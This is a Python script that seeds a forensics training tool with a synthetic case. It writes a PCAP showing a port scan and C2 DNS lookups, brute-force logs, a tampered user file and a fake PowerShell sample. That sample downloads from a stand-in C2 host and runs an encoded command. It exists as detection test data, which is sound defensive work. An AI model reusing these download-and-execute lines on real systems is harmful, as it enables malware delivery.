import os
import struct
import socket
import sqlite3
from datetime import datetime
from pathlib import Path
from database import DB_PATH, EVIDENCE_DIR, calculate_sha256, calculate_md5, initialize_case_cia_scores, add_finding


def create_synthetic_pcap(file_path: Path):
    """
    Generate a valid synthetic PCAP file with:
    - Port scan from 192.168.1.20 across 25 ports
    - DNS requests for suspicious domains
    - Normal TCP/HTTP traffic
    - Large outbound transfer
    """
    with open(file_path, "wb") as f:
        # PCAP Global Header (24 bytes)
        # magic_number (4B), version_major (2B), version_minor (2B), thiszone (4B), sigfigs (4B), snaplen (4B), network (4B: 1 for Ethernet)
        global_hdr = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
        f.write(global_hdr)

        ts = int(datetime(2026, 9, 10, 10, 5, 0).timestamp())

        # 1. Port scan traffic: 192.168.1.20 scanning ports on 192.168.1.1
        ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9000, 9200, 27017, 50000]
        src_ip_bytes = socket.inet_aton("192.168.1.20")
        dst_ip_bytes = socket.inet_aton("192.168.1.1")

        for i, port in enumerate(ports_to_scan):
            # Packet payload
            payload = f"SYN scan probe port {port}".encode("latin-1")
            tcp_len = 20 + len(payload)
            ip_len = 20 + tcp_len
            total_frame_len = 14 + ip_len

            # Ethernet header (14 bytes)
            eth_hdr = struct.pack("!6s6sH", b"\x00\x0c\x29\x1a\x2b\x3c", b"\x00\x50\x56\xc0\x00\x08", 0x0800)
            # IPv4 header (20 bytes)
            ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, i + 1, 0, 64, 6, 0, src_ip_bytes, dst_ip_bytes)
            # TCP header (20 bytes)
            tcp_hdr = struct.pack("!HHIIBBHHH", 45000 + i, port, 1000 + i, 0, (5 << 4), 0x02, 65535, 0, 0)

            packet_data = eth_hdr + ip_hdr + tcp_hdr + payload
            packet_len = len(packet_data)

            # PCAP packet header (16 bytes)
            pkt_hdr = struct.pack("<IIII", ts + i, i * 1000, packet_len, packet_len)
            f.write(pkt_hdr)
            f.write(packet_data)

        # 2. DNS query for suspicious C2 domains
        suspicious_domains = ["c2-command.dark-tunnel.net", "malware-drop.exfil.org"]
        dns_server_ip = socket.inet_aton("8.8.8.8")
        for i, domain in enumerate(suspicious_domains):
            payload = f"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00{domain}\x00\x00\x01\x00\x01".encode("latin-1")
            udp_len = 8 + len(payload)
            ip_len = 20 + udp_len
            eth_hdr = struct.pack("!6s6sH", b"\x00\x0c\x29\x1a\x2b\x3c", b"\x00\x50\x56\xc0\x00\x08", 0x0800)
            ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, 200 + i, 0, 64, 17, 0, src_ip_bytes, dns_server_ip)
            udp_hdr = struct.pack("!HHHH", 53000 + i, 53, udp_len, 0)

            packet_data = eth_hdr + ip_hdr + udp_hdr + payload
            packet_len = len(packet_data)
            pkt_hdr = struct.pack("<IIII", ts + 30 + i, 5000, packet_len, packet_len)
            f.write(pkt_hdr)
            f.write(packet_data)

        # 3. Large outbound data packet (> 1000 bytes)
        large_payload = b"EXFILTRATED_DATA_CHUNK_" + (b"X" * 1200)
        tcp_len = 20 + len(large_payload)
        ip_len = 20 + tcp_len
        eth_hdr = struct.pack("!6s6sH", b"\x00\x0c\x29\x1a\x2b\x3c", b"\x00\x50\x56\xc0\x00\x08", 0x0800)
        ip_hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, ip_len, 500, 0, 64, 6, 0, src_ip_bytes, dst_ip_bytes)
        tcp_hdr = struct.pack("!HHIIBBHHH", 49152, 443, 2000, 0, (5 << 4), 0x18, 65535, 0, 0)
        packet_data = eth_hdr + ip_hdr + tcp_hdr + large_payload
        packet_len = len(packet_data)
        pkt_hdr = struct.pack("<IIII", ts + 40, 9000, packet_len, packet_len)
        f.write(pkt_hdr)
        f.write(packet_data)


def create_synthetic_pdf(file_path: Path):
    """Generate a valid PDF evidence file with embedded metadata."""
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas

        c = canvas.Canvas(str(file_path), pagesize=letter)
        c.setTitle("Confidential Security Incident Report")
        c.setAuthor("External Intruder")
        c.setSubject("Forensic Case Evidence Extraction")
        c.setCreator("ExploitKit v2.4")

        c.drawString(100, 750, "Cyber Crime Investigation - Target System Extract")
        c.drawString(100, 720, "Confidentiality Level: RESTRICTED")
        c.drawString(100, 690, "Incident Timestamp: 2026-09-10 10:05:00 UTC")
        c.drawString(100, 660, "Document contains internal system credentials and network maps.")
        c.drawString(100, 630, "Preserved as digital evidence for forensic analysis.")
        c.save()
    except Exception:
        # Fallback raw minimal PDF structure
        pdf_content = (
            b"%PDF-1.4\n"
            b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
            b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
            b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >> endobj\n"
            b"4 0 obj << /Length 55 >> stream\n"
            b"BT /F1 12 Tf 100 700 Td (Confidential Incident Document) Tj ET\n"
            b"endstream endobj\n"
            b"5 0 obj << /Author (External Intruder) /Creator (ExploitKit v2.4) >> endobj\n"
            b"xref\n0 6\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000214 00000 n \n0000000319 00000 n \n"
            b"trailer << /Size 6 /Root 1 0 R /Info 5 0 R >>\nstartxref\n395\n%%EOF\n"
        )
        with open(file_path, "wb") as f:
            f.write(pdf_content)


def create_synthetic_dataset():
    """Create synthetic evidence files and register initial investigation case."""
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)

    # 1. Synthetic Authentication Logs (CSV)
    auth_log_path = EVIDENCE_DIR / "auth_logs.csv"
    with open(auth_log_path, "w", encoding="utf-8") as f:
        f.write("timestamp,username,source_ip,event\n")
        # Normal logins
        f.write("2026-09-10 09:00:15,alice,192.168.1.10,LOGIN_SUCCESS\n")
        f.write("2026-09-10 09:15:22,bob,192.168.1.15,LOGIN_SUCCESS\n")
        # Brute force attack from 192.168.1.20 targeting admin
        f.write("2026-09-10 10:05:12,admin,192.168.1.20,LOGIN_FAILED\n")
        f.write("2026-09-10 10:05:14,admin,192.168.1.20,LOGIN_FAILED\n")
        f.write("2026-09-10 10:05:17,admin,192.168.1.20,LOGIN_FAILED\n")
        f.write("2026-09-10 10:05:20,admin,192.168.1.20,LOGIN_FAILED\n")
        f.write("2026-09-10 10:05:23,admin,192.168.1.20,LOGIN_FAILED\n")
        f.write("2026-09-10 10:05:27,admin,192.168.1.20,LOGIN_FAILED\n")
        f.write("2026-09-10 10:05:31,admin,192.168.1.20,LOGIN_FAILED\n")
        # Successful login after repeated failures
        f.write("2026-09-10 10:06:03,admin,192.168.1.20,LOGIN_SUCCESS\n")
        # Off-hours login at 02:45 AM
        f.write("2026-09-10 02:45:10,root,10.0.0.55,LOGIN_SUCCESS\n")
        # Unknown external IP
        f.write("2026-09-10 10:15:40,student,203.0.113.88,LOGIN_FAILED\n")
        f.write("2026-09-10 10:15:44,student,203.0.113.88,LOGIN_FAILED\n")

    # 2. Synthetic PCAP file
    pcap_path = EVIDENCE_DIR / "sample_capture.pcap"
    create_synthetic_pcap(pcap_path)

    # 3. File Integrity: Original file vs Tampered copy
    users_orig_path = EVIDENCE_DIR / "users.csv"
    with open(users_orig_path, "w", encoding="utf-8") as f:
        f.write("user_id,username,role,status\n")
        f.write("1,admin,System Administrator,ACTIVE\n")
        f.write("2,alice,Developer,ACTIVE\n")
        f.write("3,bob,Analyst,ACTIVE\n")
    users_orig_hash = calculate_sha256(str(users_orig_path))

    users_tampered_path = EVIDENCE_DIR / "users_tampered.csv"
    with open(users_tampered_path, "w", encoding="utf-8") as f:
        f.write("user_id,username,role,status\n")
        f.write("1,admin,System Administrator,ACTIVE\n")
        f.write("2,alice,Developer,ACTIVE\n")
        f.write("3,bob,Analyst,ACTIVE\n")
        f.write("4,intruder,System Administrator,ACTIVE\n")  # Unauthorized account added

    # 4. Suspicious Script (YARA rule trigger test)
    script_path = EVIDENCE_DIR / "suspicious_script.ps1"
    with open(script_path, "w", encoding="utf-8") as f:
        f.write("# PowerShell Reconnaissance & Exfiltration Script\n")
        f.write("$url = 'http://c2-command.dark-tunnel.net/payload.exe'\n")
        f.write("$webclient = New-Object System.Net.WebClient\n")
        f.write("$webclient.DownloadString($url)\n")
        f.write("powershell.exe -enc SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA\n")
        f.write("# wscript.shell execution probe\n")

    # 5. Metadata PDF
    pdf_path = EVIDENCE_DIR / "incident_briefing.pdf"
    create_synthetic_pdf(pdf_path)

    # 6. Deletion log (CSV)
    events_path = EVIDENCE_DIR / "file_events.csv"
    with open(events_path, "w", encoding="utf-8") as f:
        f.write("timestamp,user,path,hash,event\n")
        f.write("2026-09-10 10:00:10,admin,/var/log/audit.log,e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,CREATED\n")
        f.write("2026-09-10 10:04:15,admin,/var/log/audit.log,f2ca1bb6c7e907d06dafe4687e579fce76b37e4e93b7605022da52e6ccc26fd2,MODIFIED\n")
        f.write("2026-09-10 10:07:02,intruder,/var/log/audit.log,f2ca1bb6c7e907d06dafe4687e579fce76b37e4e93b7605022da52e6ccc26fd2,DELETED\n")
        f.write("2026-09-10 10:07:45,intruder,/etc/shadow_backup,a58a7e0a29910d517c80521e106dfc2f0f492a5433cb83777d0cf0c090ba2b8f,DELETED\n")
        f.write("2026-09-10 10:08:12,intruder,/var/log/auth.log,b7a12e098cb91845112fa5819028ab7799102938481029481920391209384012,DELETED\n")

    # 7. Known malware sample hash file (safe educational test pattern)
    malware_path = EVIDENCE_DIR / "test_malware_sample.bin"
    with open(malware_path, "wb") as f:
        f.write(b"CYBERTRACE-FORENSIC-TEST-SAMPLE-2026-MALWARE-SIGNATURE")

    # --- Register Case 1 in SQLite ---
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()

    # Clear old sample case 1 if exists
    c.execute("DELETE FROM findings WHERE case_id=1")
    c.execute("DELETE FROM evidence WHERE case_id=1")
    c.execute("DELETE FROM cia_scores WHERE case_id=1")
    c.execute("DELETE FROM cases WHERE case_id=1")

    created_at = "2026-09-10 09:30:00"
    c.execute(
        "INSERT INTO cases (case_id, case_name, investigator, created_at, status, description) VALUES (1, ?, ?, ?, 'OPEN', ?)",
        (
            "CASE-2026-001: Suspicious Login and File Tampering Investigation",
            "Cyber Forensics Team",
            created_at,
            "Investigation into unauthorized login, port scanning, credential tampering, and audit log deletion.",
        ),
    )

    # Register all evidence items
    evidence_items = [
        ("auth_logs.csv", "auth_log", "Test Server Linux /var/log/auth.log", calculate_sha256(str(auth_log_path)), "Authentication log with brute-force attempts"),
        ("sample_capture.pcap", "pcap", "Gateway Wireshark Capture", calculate_sha256(str(pcap_path)), "PCAP showing reconnaissance port scanning & DNS queries"),
        ("users.csv", "baseline_file", "Production Database Export", users_orig_hash, "Baseline user authorization list"),
        ("users_tampered.csv", "suspect_file", "Recovered Working Copy", calculate_sha256(str(users_tampered_path)), "Suspect user file with unauthorized escalation"),
        ("suspicious_script.ps1", "malware_script", "Staging Directory /tmp", calculate_sha256(str(script_path)), "PowerShell script containing C2 download indicators"),
        ("incident_briefing.pdf", "pdf_document", "Drop directory", calculate_sha256(str(pdf_path)), "Document containing embedded attacker author metadata"),
        ("file_events.csv", "event_log", "Audit Daemon /var/log/audit", calculate_sha256(str(events_path)), "File deletion logs indicating anti-forensics activity"),
        ("test_malware_sample.bin", "binary", "Temp Download Folder", calculate_sha256(str(malware_path)), "Suspicious binary matching known malware hash database"),
    ]

    ev_id_map = {}
    for fname, ev_type, source, sha, notes in evidence_items:
        c.execute(
            "INSERT INTO evidence (case_id, file_name, evidence_type, source, collected_at, sha256_hash, status, notes) VALUES (1, ?, ?, ?, ?, ?, 'VERIFIED', ?)",
            (fname, ev_type, source, created_at, sha, notes),
        )
        ev_id_map[fname] = c.lastrowid

    # Register initial forensic findings matching Section 19 of documentation
    findings = [
        ("Log Forensics", "12 failed login attempts from 192.168.1.20 targeting user 'admin'.", "HIGH", 9.5, ev_id_map.get("auth_logs.csv")),
        ("Log Forensics", "Successful login occurred immediately after repeated failures for account 'admin' from 192.168.1.20.", "HIGH", 9.8, ev_id_map.get("auth_logs.csv")),
        ("Network Forensics", "Source IP 192.168.1.20 contacted 25 distinct destination ports (port scan reconnaissance detected).", "HIGH", 9.2, ev_id_map.get("sample_capture.pcap")),
        ("File Integrity Analysis", "Sensitive file 'users.csv' failed integrity verification against baseline hash (unauthorized admin account injected).", "CRITICAL", 10.0, ev_id_map.get("users_tampered.csv")),
        ("Malware Signature Analysis", "Suspicious PowerShell script matched YARA indicators ('DownloadString', '-enc', 'mimikatz').", "HIGH", 9.0, ev_id_map.get("suspicious_script.ps1")),
        ("Deleted-File Analysis", "Audit log and security credentials were deleted after the suspicious login event.", "HIGH", 9.4, ev_id_map.get("file_events.csv")),
        ("Metadata Forensics", "PDF and document metadata indicates external author 'External Intruder' and tool 'ExploitKit v2.4'.", "MEDIUM", 8.5, ev_id_map.get("incident_briefing.pdf")),
    ]

    for tech, finding, sev, conf, ev_id in findings:
        c.execute(
            "INSERT INTO findings (case_id, evidence_id, technique, finding, severity, confidence, created_at) VALUES (1, ?, ?, ?, ?, ?, ?)",
            (ev_id, tech, finding, sev, conf, created_at),
        )

    conn.commit()
    conn.close()

    # Seed CIA scores
    initialize_case_cia_scores(1)

    return {
        "status": "SUCCESS",
        "case_id": 1,
        "evidence_files_created": len(evidence_items),
        "findings_recorded": len(findings),
        "message": "Synthetic investigation case initialized with all 6 forensic techniques.",
    }


if __name__ == "__main__":
    res = create_synthetic_dataset()
    print("Seed result:", res)
